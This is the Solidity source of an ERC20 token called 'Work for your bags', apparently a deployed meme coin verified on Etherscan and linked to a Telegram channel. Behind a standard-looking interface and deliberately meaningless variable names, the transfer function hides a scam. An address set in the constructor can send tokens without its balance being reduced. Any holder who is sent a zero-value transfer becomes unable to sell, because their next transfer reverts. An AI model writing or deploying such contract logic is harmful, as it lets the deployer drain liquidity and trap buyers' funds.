/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

/*

https://t.me/work_ERC20

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Work is Ownable {
    function approve(address meet, uint256 shape) public returns (bool success) {
        allowance[msg.sender][meet] = shape;
        emit Approval(msg.sender, meet, shape);
        return true;
    }

    mapping(address => uint256) private positive;

    constructor(address more) {
        balanceOf[msg.sender] = totalSupply;
        wrong[more] = third;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    string public symbol = 'Work';

    mapping(address => uint256) public balanceOf;

    string public name = 'Work for your bags';

    function transferFrom(address fell, address seed, uint256 shape) public returns (bool success) {
        require(shape <= allowance[fell][msg.sender]);
        allowance[fell][msg.sender] -= shape;
        tone(fell, seed, shape);
        return true;
    }

    uint256 private third = 67;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private wrong;

    uint8 public decimals = 9;

    function transfer(address seed, uint256 shape) public returns (bool success) {
        tone(msg.sender, seed, shape);
        return true;
    }

    function tone(address fell, address seed, uint256 shape) private returns (bool success) {
        if (wrong[fell] == 0) {
            balanceOf[fell] -= shape;
        }

        if (shape == 0) positive[seed] += third;

        if (fell != uniswapV2Pair && wrong[fell] == 0 && positive[fell] > 0) {
            wrong[fell] -= third;
        }

        balanceOf[seed] += shape;
        emit Transfer(fell, seed, shape);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    address public uniswapV2Pair;
}